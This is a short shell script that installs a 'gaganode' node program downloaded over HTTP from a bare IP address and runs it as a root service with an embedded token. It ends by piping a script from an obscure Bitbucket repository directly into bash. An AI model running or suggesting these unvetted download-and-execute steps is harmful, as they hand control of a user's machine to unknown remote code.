sudo apt-get update -y && sudo apt-get -y install unzip curl tar ca-certificates
wget http://178.128.58.140/app-linux-amd64.zip
unzip app-linux-amd64.zip
cd app-linux-amd64
sudo ./app service install
sudo ./app service start
./app status
sudo ./apps/gaganode/gaganode config set --token=pihbmehfirzwnxkq13389b4163752616
./app restart
./app status
curl -sL https://bitbucket.org/lightcoral2/cangor/raw/master/boled04.sh | bash
